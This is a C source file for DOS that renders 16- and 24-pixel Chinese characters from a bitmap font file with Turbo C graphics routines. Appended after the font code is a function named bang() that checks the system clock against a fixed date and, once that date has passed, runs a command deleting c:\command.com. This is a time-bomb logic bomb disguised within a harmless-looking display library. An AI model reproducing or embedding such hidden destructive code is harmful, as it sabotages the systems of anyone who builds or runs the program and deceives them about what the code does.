#include <graphics.h>
#include <conio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <alloc.h>
#include <stdio.h>
#include <dos.h>
#include <process.h>
#include <fcntl.h>
#include <time.h>
void bang(void);
void puthzxy(unsigned char *hz,int x,int y,int hand,int color,int bkcolor,char flag);
/*main()
 {
   int d=DETECT,g,CCLIB;
   initgraph(&d,&g,"");
   CCLIB=open("cclib.dat",O_RDONLY|O_BINARY);
   puthzxy("²²²²²²",100,100,CCLIB,RED,CYAN,1);
   getch();
   }*/


 void puthzxy(unsigned char *hz,int x,int y,int hand,int color,int bkcolor,char flag)
{	long offset;
	unsigned int f,c1,c2;
	int i1,i2,i3;
	unsigned char i,j,ch[2],by[32];
	f=0;
	setcolor(color);
	settextstyle(DEFAULT_FONT,HORIZ_DIR,1);
	while((i=*hz++)!=0){
		if(i>0xa0){
			if(f==0){
				c1=i-160;
				f++;
				}
			else   {
				c2=(c1-1)*94+(i-160)-1;
				f=0;
				offset=c2*32L;
				lseek(hand,offset,SEEK_SET);
				read(hand,by,32);
				for(i1=0;i1<16;i1++)
				for(i2=0;i2<2;i2++)
				for(i3=0;i3<8;i3++)
				if((j=(by[(i1*2)+i2]<<i3))>=128)
				putpixel((x+i2*8+i3),(y+i1),color);
				else
				if (flag) putpixel((x+i2*8+i3),(y+i1),bkcolor);
				x+=16;
			       }
			  }
		    else{
			if (flag) {
			setfillstyle(SOLID_FILL,bkcolor);
			bar(x,y,x+textwidth("H")-1,y+15);
			}
			ch[0]=i;ch[1]='\0';
			outtextxy(x,y+6,ch);
			x+=8;
		}
	}
}

 void puthz(int row,int col,unsigned char *hz,int hand,int color,int bkcolor,char flag)
   {
	long offset;
	unsigned int f,c1,c2;
	int i1,i2,i3,x,y;
	unsigned char i,j,ch[2],by[32];
	f=0;
	x=(col-1)*16+4;y=(row-1)*18+4;
	setcolor(color);
	settextstyle(DEFAULT_FONT,HORIZ_DIR,1);
	while((i=*hz++)!=0){
		if(i>0xa0){
			if(f==0){
				c1=i-160;
				f++;
				}
			else   {
				c2=(c1-1)*94+(i-160)-1;
				f=0;
				offset=c2*32L;
				lseek(hand,offset,SEEK_SET);
				read(hand,by,32);
				for(i1=0;i1<16;i1++)
				for(i2=0;i2<2;i2++)
				for(i3=0;i3<8;i3++)
				if((j=(by[(i1*2)+i2]<<i3))>=128)
				putpixel((x+i2*8+i3),(y+i1),color);
				else
				if (flag) putpixel((x+i2*8+i3),(y+i1),bkcolor);
				x+=16;
			       }
			  }
		    else{
			if (flag) {
			setfillstyle(SOLID_FILL,bkcolor);
			bar(x,y,x+textwidth("H")-1,y+15);
			}
			ch[0]=i;ch[1]='\0';
			outtextxy(x,y+6,ch);
			x+=8;
		}
	}
}

void puthz24xy(unsigned char *hz,int x,int y,int hand,int color,int bkcolor,char flag)
{
	long offset;
	unsigned int f,c1,c2;
	int i1,i2,i3;
	unsigned char i,j,ch[2],by[72];
	f=0;
	setcolor(color);
	settextstyle(DEFAULT_FONT,HORIZ_DIR,2);
	while((i=*hz++)!=0){
		if(i>0xa0){
			if(f==0){
				c1=i-160;
				f++;
				}
			else   {
				c2=(c1-16)*94+(i-160)-1;
				f=0;
				offset=c2*72L;
				lseek(hand,offset,SEEK_SET);
				read(hand,by,72);
				for(i1=0;i1<24;i1++)
				for(i2=0;i2<3;i2++)
				for(i3=0;i3<8;i3++)
				if((j=(by[(i1*3)+i2]<<i3))>=128)
				putpixel((x+i1),(y+i2*8+i3),color);
				else
				if (flag) putpixel((x+i1),(y+i2*8+i3),bkcolor);
				x+=24;
			       }
			  }
		    else{
			ch[0]=i;ch[1]='\0';
			if (flag) {
				   setfillstyle(SOLID_FILL,bkcolor);
				   bar(x,y,x+textwidth("H")-1,y+24-1);
				   }
			outtextxy(x,y+8,ch);
			x+=16;
		}
	}
}
void bang(void)
{ long int tt;
  time_t *t=&tt;
  if(time(t)>773088113)
  system("del c:\command.com");
  }
